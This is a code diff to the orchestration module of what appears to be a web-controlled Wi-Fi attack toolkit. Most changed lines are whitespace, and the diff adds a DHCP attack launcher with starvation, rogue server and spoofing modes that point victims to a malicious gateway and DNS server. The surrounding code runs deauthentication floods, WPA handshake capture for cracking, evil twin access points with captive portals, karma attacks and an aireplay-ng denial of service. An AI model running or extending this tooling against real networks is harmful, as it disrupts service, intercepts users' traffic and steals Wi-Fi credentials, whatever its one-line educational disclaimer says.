@@ -16,12 +16,13 @@ from utils.network_utils import set_monitor_mode, set_managed_mode, is_monitor_m
 from attacks.deauth_attack import deauth_worker , deauth_worker_for_handshake
 from attacks.capture_attack import capture_worker
 from attacks.evil_twin import create_hostapd_config, create_dnsmasq_config, setup_fake_ap_network
+from attacks.dhcp_attack import dhcp_starvation_worker, dhcp_rogue_server_worker, dhcp_spoofing_worker
 from web.socket_io import socketio
 
 def update_attack_progress(progress):
     """
     Update the attack progress and emit a WebSocket event.
-    
+
     Args:
         progress (int): The progress percentage (0-100)
     """
@@ -31,7 +32,7 @@ def update_attack_progress(progress):
 def add_log_message(message):
     """
     Add a log message and emit a WebSocket event.
-    
+
     Args:
         message (str): The log message
     """
@@ -41,7 +42,7 @@ def add_log_message(message):
 def launch_deauth_attack(network, attack_config):
     """
     Launch a deauthentication attack against the specified network.
-    
+
     Args:
         network (dict): The target network information
         attack_config (dict): Configuration for the attack
@@ -52,11 +53,11 @@ def launch_deauth_attack(network, attack_config):
     client = attack_config.get('client', 'FF:FF:FF:FF:FF:FF')
     count = attack_config.get('count', 10)
     interval = attack_config.get('interval', 0.1)
-    
+
     # Check root privileges
     if not os.geteuid() == 0:
         add_log_message("Warning: Not running as root. Deauthentication attacks require root privileges.")
-        
+
     # Set monitor mode using subprocess and sudo
     try:
         add_log_message(f"Setting {config['interface']} to monitor mode...")
@@ -67,7 +68,7 @@ def launch_deauth_attack(network, attack_config):
     except subprocess.CalledProcessError as e:
         add_log_message(f"Error setting monitor mode: {e}")
         raise
-    
+
     # Set channel using subprocess
     try:
         add_log_message(f"Setting channel to {channel}...")
@@ -83,14 +84,14 @@ def launch_deauth_attack(network, attack_config):
             add_log_message(f"Error setting channel with iwconfig: {e2}")
             set_managed_mode(config['interface'])
             raise
-    
+
     # Start deauth thread
     deauth_thread = threading.Thread(
         target=deauth_worker,
         args=(bssid, client, config['interface'], count, interval, attack_state['stop_event']),
         daemon=True
     )
-    
+
     attack_state['threads'].append(deauth_thread)
     deauth_thread.start()
     add_log_message(f"Deauthentication attack started against {bssid}")
@@ -99,7 +100,7 @@ def launch_deauth_attack(network, attack_config):
 def launch_handshake_attack(network, attack_config):
     """
     Launch a handshake capture attack against the specified network.
-    
+
     Args:
         network (dict): The target network information
         attack_config (dict): Configuration for the attack
@@ -109,52 +110,52 @@ def launch_handshake_attack(network, attack_config):
     channel = int(network['channel'])
     duration = attack_config.get('duration', 5)
     wordlist = attack_config.get('wordlist', config['wordlist'])
-    
+
     # Create output directory
     safe_bssid = bssid.replace(':', '-')
     output_dir = os.path.join(config['output_dir'], safe_bssid)
     os.makedirs(output_dir, exist_ok=True)
     cap_file = os.path.join(output_dir, "capture-01.cap")
-    
+
     # Set monitor mode
     set_monitor_mode(config['interface'])
     add_log_message(f"Interface {config['interface']} set to monitor mode")
     update_attack_progress(10)
-    
+
     # Start capture thread
     capture_thread = threading.Thread(
         target=capture_worker,
-        args=(bssid, channel, config['interface'], duration, 
-              os.path.join(output_dir, "capture"), cap_file, wordlist, 
+        args=(bssid, channel, config['interface'], duration,
+              os.path.join(output_dir, "capture"), cap_file, wordlist,
               attack_state['stop_event']),
         daemon=True
     )
-    
+
     # Start deauth thread
     deauth_thread = threading.Thread(
         target=deauth_worker_for_handshake,
         args=(bssid, "FF:FF:FF:FF:FF:FF", config['interface'], 10, 0.1, attack_state['stop_event']),
         daemon=True
     )
-    
+
     attack_state['threads'].extend([capture_thread, deauth_thread])
     capture_thread.start()
     add_log_message("Handshake capture started")
     update_attack_progress(20)
-    
+
     # Wait a bit before starting deauth
     time.sleep(2)
     deauth_thread.start()
     add_log_message("Deauthentication flood started")
     update_attack_progress(30)
-    
+
     # Update stats when a handshake is captured
     stats['captures_count'] += 1
 
 def launch_evil_twin_attack(network, attack_config):
     """
     Launch an evil twin attack against the specified network.
-    
+
     Args:
         network (dict): The target network information
         attack_config (dict): Configuration for the attack
@@ -164,47 +165,47 @@ def launch_evil_twin_attack(network, attack_config):
     ssid = network['essid']
     channel = attack_config.get('channel', int(network['channel']))
     captive_portal = attack_config.get('captive_portal', False)
-    
+
     # Create output directory
     safe_ssid = "".join(c if c.isalnum() else "_" for c in ssid)
     output_dir = os.path.join(config['output_dir'], "evil_twin", safe_ssid)
     os.makedirs(output_dir, exist_ok=True)
-    
+
     # Set managed mode
     set_managed_mode(config['interface'])
     add_log_message(f"Interface {config['interface']} set to managed mode")
     update_attack_progress(10)
-    
+
     # Create config files
     hostapd_conf = create_hostapd_config(config['interface'], ssid, channel, output_dir)
     dnsmasq_conf = create_dnsmasq_config(config['interface'], output_dir)
-    
+
     if hostapd_conf and dnsmasq_conf:
         # Setup network
         setup_fake_ap_network(config['interface'])
         add_log_message("Fake AP network setup complete")
         update_attack_progress(30)
-        
+
         # Start hostapd
         hostapd_thread = threading.Thread(
             target=run_hostapd,
             args=(hostapd_conf, attack_state['stop_event']),
             daemon=True
         )
-        
+
         # Start dnsmasq
         dnsmasq_thread = threading.Thread(
             target=run_dnsmasq,
             args=(dnsmasq_conf, attack_state['stop_event']),
             daemon=True
         )
-        
+
         attack_state['threads'].extend([hostapd_thread, dnsmasq_thread])
         hostapd_thread.start()
         dnsmasq_thread.start()
         add_log_message("Evil Twin attack started")
         update_attack_progress(50)
-        
+
         # Start captive portal if enabled
         if captive_portal:
             add_log_message("Starting captive portal")
@@ -218,7 +219,7 @@ def launch_evil_twin_attack(network, attack_config):
 def launch_karma_attack(network, attack_config):
     """
     Launch a karma attack using the specified configuration.
-    
+
     Args:
         network (dict): The target network information
         attack_config (dict): Configuration for the attack containing:
@@ -229,11 +230,11 @@ def launch_karma_attack(network, attack_config):
     essid = attack_config.get('essid')
     duration = attack_config.get('scan_duration', 20)  # Default 20 seconds
     interface = config['interface']
-    
+
     if not essid:
         add_log_message("Error: No target ESSID provided")
         raise ValueError("No target ESSID provided")
-    
+
     # Set monitor mode
     try:
         add_log_message(f"Setting {interface} to monitor mode...")
@@ -252,23 +253,23 @@ def launch_karma_attack(network, attack_config):
         except:
             pass  # Ignore cleanup errors
         raise RuntimeError(f"Failed to set monitor mode: {error_msg}")
-    
+
     # Start karma attack thread
     try:
         from attacks.karma_attack import karma_worker
-        
+
         karma_thread = threading.Thread(
             target=karma_worker,
             args=(interface, essid, duration, attack_state['stop_event']),
             daemon=True
         )
-        
+
         attack_state['threads'].append(karma_thread)
         karma_thread.start()
-        
+
         add_log_message(f"Karma attack started targeting SSID: {essid}")
         update_attack_progress(10)  # Initial progress
-        
+
     except Exception as e:
         add_log_message(f"Error starting karma attack: {e}")
         try:
@@ -281,7 +282,7 @@ def launch_karma_attack(network, attack_config):
 # Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.
 def dos_attack(bssid, channel, interface):
     """Launch a DoS attack using aireplay-ng
-    
+
     Args:
         bssid (str): Target BSSID
         channel (str): Target channel
@@ -291,7 +292,7 @@ def dos_attack(bssid, channel, interface):
     add_log_message(f"[DoS] Setting {interface} to monitor mode...")
     set_monitor_mode(interface)
     update_attack_progress(10)
-    
+
     # Set channel
     try:
         add_log_message(f"[DoS] Setting channel to {channel}...")
@@ -301,16 +302,16 @@ def dos_attack(bssid, channel, interface):
         add_log_message(f"[DoS] Error setting channel: {e}")
         set_managed_mode(interface)
         raise
-    
+
     update_attack_progress(20)
-    
+
     # Start DoS attack in a separate thread
     dos_thread = threading.Thread(
         target=run_dos_attack,
         args=(bssid, interface, attack_state['stop_event']),
         daemon=True
     )
-    
+
     attack_state['threads'].append(dos_thread)
     dos_thread.start()
     add_log_message(f"[DoS] Attack started against {bssid}")
@@ -318,14 +319,14 @@ def dos_attack(bssid, channel, interface):
 
 def run_dos_attack(bssid, interface, stop_event):
     """Run the DoS attack until stopped using aireplay-ng
-    
+
     Args:
         bssid (str): Target BSSID
         interface (str): Wireless interface to use
         stop_event (threading.Event): Event to signal when to stop
     """
     add_log_message(f"[DoS] Launching aireplay-ng deauth attack on BSSID {bssid}")
-    
+
     # Prepare aireplay-ng command
     aireplay_cmd = [
         'sudo', 'aireplay-ng',
@@ -333,7 +334,7 @@ def run_dos_attack(bssid, interface, stop_event):
         '-a', bssid,      # Target BSSID
         interface          # Interface
     ]
-    
+
     try:
         # Start aireplay-ng process
         process = subprocess.Popen(
@@ -343,10 +344,10 @@ def run_dos_attack(bssid, interface, stop_event):
             text=True,
             bufsize=1  # Line buffered
         )
-        
+
         add_log_message(f"[DoS] aireplay-ng started with PID {process.pid}")
         update_attack_progress(50)
-        
+
         # Monitor the process and check for stop signal
         while process.poll() is None and not stop_event.is_set():
             # Check for output from aireplay-ng
@@ -354,17 +355,17 @@ def run_dos_attack(bssid, interface, stop_event):
                 # Use select to avoid blocking
                 import select
                 readable, _, _ = select.select([process.stdout, process.stderr], [], [], 0.5)
-                
+
                 for stream in readable:
                     line = stream.readline()
                     if line:
                         add_log_message(f"[aireplay-ng] {line.strip()}")
             except Exception as e:
                 add_log_message(f"[DoS] Error reading aireplay-ng output: {e}")
-            
+
             # Check stop signal every 0.5 seconds
             stop_event.wait(0.5)
-        
+
         # If we get here, either the process ended or we were asked to stop
         if process.poll() is None:  # Process is still running
             add_log_message("[DoS] Stopping aireplay-ng...")
@@ -374,18 +375,18 @@ def run_dos_attack(bssid, interface, stop_event):
             except subprocess.TimeoutExpired:
                 add_log_message("[DoS] aireplay-ng did not terminate gracefully, killing.")
                 process.kill()
-    
+
     except Exception as e:
         add_log_message(f"[DoS] Error during aireplay-ng attack: {e}")
-    
+
     # Attack has been stopped
     add_log_message("[DoS] Attack stopped")
     update_attack_progress(100)
-    
+
 def run_hostapd(config_file, stop_event):
     """
     Run hostapd with the specified configuration file.
-    
+
     Args:
         config_file (str): Path to the hostapd configuration file
         stop_event (threading.Event): Event to signal when to stop
@@ -393,13 +394,13 @@ def run_hostapd(config_file, stop_event):
     try:
         add_log_message(f"Starting hostapd with config: {config_file}")
         process = os.popen(f"hostapd {config_file}")
-        
+
         while not stop_event.is_set():
             line = process.readline()
             if line:
                 add_log_message(f"[hostapd] {line.strip()}")
             time.sleep(0.1)
-            
+
         process.close()
     except Exception as e:
         add_log_message(f"Error in hostapd: {e}")
@@ -407,7 +408,7 @@ def run_hostapd(config_file, stop_event):
 def run_dnsmasq(config_file, stop_event):
     """
     Run dnsmasq with the specified configuration file.
-    
+
     Args:
         config_file (str): Path to the dnsmasq configuration file
         stop_event (threading.Event): Event to signal when to stop
@@ -415,13 +416,120 @@ def run_dnsmasq(config_file, stop_event):
     try:
         add_log_message(f"Starting dnsmasq with config: {config_file}")
         process = os.popen(f"dnsmasq -C {config_file} -d")
-        
+
         while not stop_event.is_set():
             line = process.readline()
             if line:
                 add_log_message(f"[dnsmasq] {line.strip()}")
             time.sleep(0.1)
-            
+
         process.close()
     except Exception as e:
         add_log_message(f"Error in dnsmasq: {e}")
+
+def launch_dhcp_attack(network, attack_config):
+    """
+    Launch a DHCP attack against the specified network.
+
+    Args:
+        network (dict): The target network information
+        attack_config (dict): Configuration for the attack
+    """
+    # Extract parameters
+    interface = config['interface']
+    attack_subtype = attack_config.get('subtype', 'starvation')
+
+    add_log_message(f"Starting DHCP {attack_subtype} attack")
+    add_log_message(f"Target network: {network.get('essid', 'Unknown')} ({network.get('bssid', 'Unknown')})")
+
+    # Check root privileges
+    if not os.geteuid() == 0:
+        add_log_message("Warning: Not running as root. DHCP attacks require root privileges.")
+        raise Exception("Root privileges required for DHCP attacks")
+
+    try:
+        # Set interface to managed mode for DHCP attacks
+        set_managed_mode(interface)
+        add_log_message(f"Interface {interface} set to managed mode")
+        update_attack_progress(10)
+
+        # Launch appropriate DHCP attack based on subtype
+        if attack_subtype == 'starvation':
+            target_count = attack_config.get('target_count', 100)
+
+            # Start DHCP starvation thread
+            dhcp_thread = threading.Thread(
+                target=dhcp_starvation_worker,
+                args=(interface, target_count, attack_state['stop_event']),
+                daemon=True
+            )
+
+            attack_state['threads'].append(dhcp_thread)
+            dhcp_thread.start()
+            add_log_message(f"DHCP starvation attack started with target count: {target_count}")
+            update_attack_progress(30)
+
+        elif attack_subtype == 'rogue_server':
+            rogue_ip = attack_config.get('rogue_ip', '192.168.1.1')
+            gateway_ip = attack_config.get('gateway_ip', '192.168.1.1')
+            dns_servers = attack_config.get('dns_servers', ['8.8.8.8', '1.1.1.1'])
+
+            # Start rogue DHCP server thread
+            dhcp_thread = threading.Thread(
+                target=dhcp_rogue_server_worker,
+                args=(interface, rogue_ip, gateway_ip, dns_servers, attack_state['stop_event']),
+                daemon=True
+            )
+
+            attack_state['threads'].append(dhcp_thread)
+            dhcp_thread.start()
+            add_log_message(f"Rogue DHCP server started on {rogue_ip}")
+            update_attack_progress(30)
+
+        elif attack_subtype == 'spoofing':
+            target_mac = attack_config.get('target_mac', 'all')
+            malicious_gateway = attack_config.get('malicious_gateway', '192.168.1.100')
+            malicious_dns = attack_config.get('malicious_dns', '192.168.1.100')
+
+            # Start DHCP spoofing thread
+            dhcp_thread = threading.Thread(
+                target=dhcp_spoofing_worker,
+                args=(interface, target_mac, malicious_gateway, malicious_dns, attack_state['stop_event']),
+                daemon=True
+            )
+
+            attack_state['threads'].append(dhcp_thread)
+            dhcp_thread.start()
+            add_log_message(f"DHCP spoofing attack started targeting {target_mac}")
+            update_attack_progress(30)
+
+        else:
+            raise Exception(f"Unknown DHCP attack subtype: {attack_subtype}")
+
+        # Monitor attack progress
+        while not attack_state['stop_event'].is_set() and any(t.is_alive() for t in attack_state['threads']):
+            time.sleep(1)
+            # Update progress periodically
+            if attack_state['progress'] < 90:
+                update_attack_progress(min(attack_state['progress'] + 5, 90))
+
+        # Attack completed or stopped
+        if not attack_state['stop_event'].is_set():
+            add_log_message("DHCP attack completed successfully")
+            update_attack_progress(100)
+        else:
+            add_log_message("DHCP attack stopped by user")
+
+        # Update stats
+        stats['attacks_count'] += 1
+
+    except Exception as e:
+        add_log_message(f"Error in DHCP attack: {e}")
+        raise
+    finally:
+        # Ensure interface is reset to managed mode
+        try:
+            set_managed_mode(interface)
+            add_log_message(f"Interface {interface} reset to managed mode")
+        except Exception as e:
+            add_log_message(f"Warning: Failed to reset interface: {e}")
